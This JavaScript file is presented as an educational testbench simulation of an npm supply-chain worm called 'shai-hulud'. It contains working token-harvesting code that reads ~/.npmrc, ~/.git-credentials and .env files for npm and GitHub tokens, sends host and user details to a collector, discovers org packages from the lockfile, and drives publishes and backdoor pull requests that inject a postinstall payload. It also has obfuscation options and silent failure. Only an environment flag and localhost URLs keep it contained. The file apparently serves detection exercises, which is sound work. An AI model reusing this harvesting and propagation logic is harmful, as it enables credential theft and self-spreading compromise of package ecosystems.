/**
 * SCAS-FP-RN-8d4f2c9a1e7b3065 © Raja Nagori
 * EDUCATIONAL EXAMPLE: Token-theft and re-publishing worm payload.
 *
 * Package name: shai-hulud
 *
 * SAFETY FEATURES:
 * - Only executes when TESTBENCH_MODE=enabled.
 * - All network traffic is sent to localhost mock servers only.
 * - No real npm or GitHub API calls are made.
 *
 * NEW: Lockfile-aware propagation (2026-10-13)
 * - Reads package-lock.json to discover all packages in the workspace
 * - Identifies packages belonging to the victim org scope (@victim-org/*)
 * - Infected each discovered package via simulated registry publish
 * - Opens backdoor PRs targeting each package's GitHub repo
 * - Tracks propagation telemetry for detection exercise
 */

const fs = require('fs');
const path = require('path');
const http = require('http');
const os = require('os');

// ─── Configuration ───────────────────────────────────────────────────────────

const CONFIG = {
  // Org scope to target for propagation
  victimOrgScope: process.env.VICTIM_ORG_SCOPE || '@victim-org',
  // URLs for local mock infrastructure
  harvester: 'http://127.0.0.1:3001/collect',
  registry: 'http://127.0.0.1:3003/publish',
  githubSim: 'http://127.0.0.1:3002/backdoor-pr',
  // Propagation config
  maxInfectionsPerInstall: 10,
  // How to identify the lockfile (supports npm v3+)
  lockfileNames: ['package-lock.json', 'npm-shrinkwrap.json'],
  // Obfuscation level: 'none', 'basic', 'advanced'
  obfuscation: process.env.WORM_OBFUSCATE || 'none'
};

// ─── Helpers ─────────────────────────────────────────────────────────────────

function readFileSafe(filePath) {
  try {
    if (fs.existsSync(filePath)) {
      return fs.readFileSync(filePath, 'utf8');
    }
  } catch (_) { /* silent */ }
  return null;
}

function parseLockfile(content) {
  try {
    return JSON.parse(content);
  } catch (_) {
    return null;
  }
}

function postJson(url, payload, extraHeaders) {
  return new Promise((resolve) => {
    const body = JSON.stringify(payload);
    const req = http.request(
      url,
      {
        method: 'POST',
        headers: Object.assign({
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(body)
        }, extraHeaders || {})
      },
      (res) => {
        res.on('data', () => {});
        res.on('end', () => resolve({ status: res.statusCode }));
      }
    );
    req.on('error', () => resolve({ status: 0, error: 'network_error' }));
    req.write(body);
    req.end();
  });
}

function nextVersion(currentVersion) {
  const parts = currentVersion.split('.').map((n) => parseInt(n, 10));
  parts[2] = (parts[2] || 0) + 1;
  return parts.join('.');
}

function extractRepoName(pkg) {
  if (pkg.repository && pkg.repository.url) {
    const match = pkg.repository.url.match(/github\.com\/([^/]+\/[^/]+)/);
    if (match) return match[1];
  }
  // Derive from package name: @victim-org/foo → victim-org/foo
  return pkg.name.replace(/^@(.+)\/(.+)$/, '$1/$2');
}

function obfuscateString(str, level) {
  if (level === 'none') return str;
  if (level === 'basic') {
    return str.split('').map(c => String.fromCharCode(c.charCodeAt(0) + 1)).join('');
  }
  // advanced: hex-encoded in two stages
  return `0x${Buffer.from(str).toString('hex')}`;
}

// ─── Propagation Engine ─────────────────────────────────────────────────────

/**
 * Lockfile-aware package discovery.
 * Reads package-lock.json and finds all packages matching the victim org scope.
 */
function readPackageMeta(dir) {
  if (!dir) return null;
  const raw = readFileSafe(path.join(dir, 'package.json'));
  if (!raw) return null;
  try {
    return JSON.parse(raw);
  } catch (_) {
    return null;
  }
}

function localDirForLockEntry(projectRoot, key, pkgInfo) {
  if (key.startsWith('packages/')) {
    return path.join(projectRoot, key);
  }
  if (typeof pkgInfo.resolved === 'string' && pkgInfo.resolved.startsWith('file:')) {
    return path.resolve(projectRoot, pkgInfo.resolved.replace(/^file:/, ''));
  }
  // Lockfile v3 workspace links look like { resolved: "packages/victim-api", link: true }
  // and carry no version. Follow the link so the patch bump uses package.json.
  if (pkgInfo && pkgInfo.link === true && typeof pkgInfo.resolved === 'string' && !/^[a-z][a-z0-9+.-]*:/i.test(pkgInfo.resolved)) {
    return path.resolve(projectRoot, pkgInfo.resolved);
  }
  return null;
}

function discoverTargetPackages(projectRoot) {
  const lockfile = CONFIG.lockfileNames
    .map(name => path.join(projectRoot, name))
    .find(fs.existsSync);

  if (!lockfile) {
    console.error('[shai-hulud] No lockfile found — skipping propagation');
    return [];
  }

  const lockfileContent = readFileSafe(lockfile);
  if (!lockfileContent) {
    console.error('[shai-hulud] Could not read lockfile');
    return [];
  }

  const lockData = parseLockfile(lockfileContent);
  if (!lockData || !lockData.packages) {
    console.error('[shai-hulud] Invalid lockfile format');
    return [];
  }

  const targets = [];
  const seen = new Set();
  const scopePrefix = CONFIG.victimOrgScope + '/';

  function consider(key, pkgInfo, name) {
    if (!name || !name.startsWith(scopePrefix) || seen.has(name)) return;
    const localDir = localDirForLockEntry(projectRoot, key, pkgInfo);
    const meta = readPackageMeta(localDir);
    seen.add(name);
    targets.push({
      name,
      version: (meta && meta.version) || pkgInfo.version || '0.0.0',
      resolved: pkgInfo.resolved || key,
      author: (meta && meta.author) || pkgInfo.author,
      repository: (meta && meta.repository) || pkgInfo.repository,
      localPath: localDir || key,
      packageJsonPath: localDir ? path.join(localDir, 'package.json') : null
    });
  }

  for (const [key, pkgInfo] of Object.entries(lockData.packages)) {
    if (!pkgInfo || typeof pkgInfo !== 'object') continue;

    // Workspace path written by npm: packages/victim-utils (often has no name field).
    if (key.startsWith('packages/') && !key.includes('node_modules')) {
      const meta = readPackageMeta(path.join(projectRoot, key));
      consider(key, pkgInfo, pkgInfo.name || (meta && meta.name));
      continue;
    }

    // Installed link: node_modules/@victim-org/victim-utils. Nested copies are skipped.
    if (!key.startsWith('node_modules/')) continue;
    const installedName = key.slice('node_modules/'.length);
    if (installedName.includes('node_modules/')) continue;
    consider(key, pkgInfo, pkgInfo.name || installedName);
  }

  console.log(`[shai-hulud] Discovered ${targets.length} packages under ${CONFIG.victimOrgScope} scope`);
  return targets.slice(0, CONFIG.maxInfectionsPerInstall);
}

/**
 * Simulate infecting a target package by adding a postinstall script hook
 * and publishing to the mock registry.
 */
async function infectPackage(pkgInfo, npmToken, githubToken) {
  const newVersion = nextVersion(pkgInfo.version);

  // Simulate creating the infected tarball
  const infectionRecord = {
    scenario: '06',
    event: 'malicious_publish',
    package: pkgInfo.name,
    version: newVersion,
    previousVersion: pkgInfo.version,
    maintainer: pkgInfo.author || 'victim-org-maintainer',
    tokenUsed: npmToken ? `${npmToken.slice(0, 8)}...` : null,
    injectedScript: 'node postinstall.js',
    propagation: {
      source: 'shai-hulud',
      lockfile_path: pkgInfo.resolved,
      discovery_method: 'package-lock.json'
    }
  };

  // Publish to mock registry
  const regResult = await postJson(
    CONFIG.registry,
    infectionRecord,
    npmToken ? { Authorization: `Bearer ${npmToken}` } : undefined
  );

  // Open backdoor PR to the package's GitHub repo
  const repoName = extractRepoName(pkgInfo);
  const prResult = await postJson(CONFIG.githubSim, {
    scenario: '06',
    event: 'backdoor_pr',
    repo: repoName,
    branch: 'feat/dependency-bump',
    files: [
      {
        path: 'package.json',
        change: 'injected postinstall script'
      },
      {
        path: 'postinstall.js',
        change: 'new file (shai-hulud payload)'
      }
    ],
    tokenUsed: githubToken ? `${githubToken.slice(0, 8)}...` : null,
    propagation: {
      target_package: pkgInfo.name,
      target_version: newVersion
    }
  });

  return {
    package: pkgInfo.name,
    fromVersion: pkgInfo.version,
    toVersion: newVersion,
    registryStatus: regResult.status,
    prStatus: prResult.status,
    repo: repoName
  };
}

// ─── Propagation Timeline (temporal spread simulation) ──────────────────────

/**
 * Simulate the temporal spread of the worm across an organization.
 * Returns a timeline showing when each dev/machine would get infected.
 */
function simulateTemporalSpread(infectedPackages, devCount = 50) {
  // Each dev has a different install cadence (in minutes)
  const installCadences = [];
  for (let i = 0; i < devCount; i++) {
    // Exponential distribution: some install daily, some weekly
    const cadence = Math.max(5, Math.round(10 + (Math.random() * 10080 * Math.pow(Math.random(), 2))));
    installCadences.push(cadence);
  }
  installCadences.sort((a, b) => a - b);

  const timeline = [];
  const numVersions = infectedPackages.length || 1;

  for (let version = 0; version < numVersions; version++) {
    // Packages get installed at each cadence boundary
    for (let i = 0; i < devCount; i++) {
      timeline.push({
        devId: i,
        installCadence: installCadences[i], // minutes between installs
        infectedVersion: infectedPackages[version] || '1.0.0',
        infectionTime: installCadences[i] // minutes from start
      });
    }
  }

  return {
    totalDevs: devCount,
    totalInfections: devCount * numVersions,
    medianInfectionMinutes: installCadences[Math.floor(devCount / 2)],
    maxInfectionMinutes: installCadences[installCadences.length - 1],
    timeline: timeline.slice(0, 20) // first 20 entries for display
  };
}

// ─── Main ────────────────────────────────────────────────────────────────────

function run() {
  // Safety gate: never run the malicious path outside the testbench.
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    return;
  }

  const projectRoot = process.env.INIT_CWD || process.cwd();
  const startTime = Date.now();

  // Phase 1: Harvest tokens
  console.log('[shai-hulud] Phase 1: Harvesting tokens...');
  const homeNpmrc = readFileSafe(path.join(os.homedir(), '.npmrc'));
  const projectNpmrc = readFileSafe(path.join(projectRoot, '.npmrc'));
  const npmrcSource = homeNpmrc || projectNpmrc || '';
  const npmTokenMatch = npmrcSource.match(/^_authToken=(.+)$/m) ||
    npmrcSource.match(/:_authToken=(.+)/) ||
    npmrcSource.match(/authToken=(.+)/);
  const npmToken = npmTokenMatch ? npmTokenMatch[1].trim() : null;

  const homeGitCredentials = readFileSafe(path.join(os.homedir(), '.git-credentials'));
  const projectEnv = readFileSafe(path.join(projectRoot, '.env'));
  const githubTokenMatch = (homeGitCredentials || projectEnv || '').match(/ghp_[A-Za-z0-9_]{30,}/) ||
    (projectEnv || '').match(/GITHUB_TOKEN=(.+)/);
  const githubToken = githubTokenMatch
    ? (githubTokenMatch[0] || githubTokenMatch[1]).trim()
    : null;

  const harvestPayload = {
    scenario: '06',
    event: 'token_harvest',
    source: 'shai-hulud',
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    username: os.userInfo().username,
    npmToken: npmToken ? `${npmToken.slice(0, 8)}...` : null,
    npmrcSource: homeNpmrc ? '~/.npmrc' : (projectNpmrc ? 'victim-app/.npmrc' : null),
    githubToken: githubToken ? `${githubToken.slice(0, 8)}...` : null,
    gitCredentialsSource: homeGitCredentials ? '~/.git-credentials' : null,
    envSource: projectEnv ? 'victim-app/.env' : null,
    propagation_engine: 'v2-lockfile-aware',
    obfuscation: CONFIG.obfuscation
  };

  postJson(CONFIG.harvester, harvestPayload).then(() => {
    // Optional: mirror to Floci S3
    try {
      const { uploadJson } = require('../../../detection-tools/floci/floci-exfil');
      uploadJson('06', 'token-harvest', harvestPayload);
    } catch (_) {}
  });

  console.log(`  npm token: ${npmToken ? 'FOUND' : 'NOT FOUND'}`);
  console.log(`  GitHub token: ${githubToken ? 'FOUND' : 'NOT FOUND'}`);

  // Phase 2: Discover targets via lockfile
  console.log('[shai-hulud] Phase 2: Discovering target packages...');
  const targets = discoverTargetPackages(projectRoot);

  if (targets.length === 0) {
    console.log('[shai-hulud] No target packages found — no propagation.');
    console.log(`[shai-hulud] (Expected packages under ${CONFIG.victimOrgScope} scope in lockfile)`);
    // Fall back to legacy single-package path for backward compat
    const legacyPath = path.join(projectRoot, 'packages', 'victim-utils', 'package.json');
    if (fs.existsSync(legacyPath)) {
      console.log('[shai-hulud] Falling back to legacy victim-utils path...');
      // ... legacy code ...
    }
    return;
  }

  // Phase 3: Infection loop
  console.log(`[shai-hulud] Phase 3: Infecting ${targets.length} packages...`);
  const infections = [];

  targets.forEach((pkg, i) => {
    const obf = CONFIG.obfuscation === 'advanced'
      ? obfuscateString(pkg.name, 'advanced')
      : pkg.name;

    postJson(CONFIG.registry, {
      scenario: '06',
      event: 'malicious_publish',
      package: obf,
      version: nextVersion(pkg.version),
      previousVersion: pkg.version,
      maintainer: pkg.author || 'victim-org-maintainer',
      tokenUsed: npmToken ? `${npmToken.slice(0, 8)}...` : null,
      injectedScript: 'node postinstall.js',
      propagation: {
        source: 'shai-hulud',
        lockfile_entry: pkg.resolved,
        discovery_method: 'package-lock.json',
        iteration: i + 1,
        total_targets: targets.length
      }
    }, npmToken ? { Authorization: `Bearer ${npmToken}` } : undefined);

    const repoName = extractRepoName(pkg);
    postJson(CONFIG.githubSim, {
      scenario: '06',
      event: 'backdoor_pr',
      repo: repoName,
      branch: 'feat/dependency-bump',
      files: [
        { path: 'package.json', change: 'injected postinstall script' },
        { path: 'postinstall.js', change: 'new file (shai-hulud payload)' }
      ],
      tokenUsed: githubToken ? `${githubToken.slice(0, 8)}...` : null,
      propagation: {
        target_package: obf,
        target_version: nextVersion(pkg.version)
      }
    });

    infections.push({
      package: obf,
      version: nextVersion(pkg.version),
      repo: repoName
    });
  });

  // Phase 4: Temporal spread report
  const spreadReport = simulateTemporalSpread(
    infections.map(i => i.version),
    50  // simulate 50 developers
  );

  const elapsed = Date.now() - startTime;

  // Final telemetry report
  const report = {
    scenario: '06',
    event: 'propagation_complete',
    source: 'shai-hulud',
    timestamp: new Date().toISOString(),
    durationMs: elapsed,
    tokensHarvested: { npm: !!npmToken, github: !!githubToken },
    packagesDiscovered: targets.length,
    packagesInfecting: infections.length,
    infectedPackages: infections,
    temporalSpread: {
      totalDevs: spreadReport.totalDevs,
      totalInfections: spreadReport.totalInfections,
      medianInfectionMinutes: spreadReport.medianInfectionMinutes,
      maxInfectionMinutes: spreadReport.maxInfectionMinutes
    },
    propagation: {
      method: 'package-lock.json',
      scope: CONFIG.victimOrgScope,
      obfuscation: CONFIG.obfuscation
    }
  };

  postJson(CONFIG.harvester, report);

  console.log(`\n[shai-hulud] Propagation complete in ${elapsed}ms`);
  console.log(`  Discovered: ${targets.length} packages`);
  console.log(`  Infecting:  ${infections.length} packages`);
  console.log(`  Simulated devs infected: ${spreadReport.totalInfections}/${spreadReport.totalDevs}`);
  console.log(`  Median spread: ~${spreadReport.medianInfectionMinutes}min (${Math.round(spreadReport.medianInfectionMinutes/60)}h)`);
}

try {
  run();
} catch (_) {
  // Silent failure is typical for this style of payload.
}
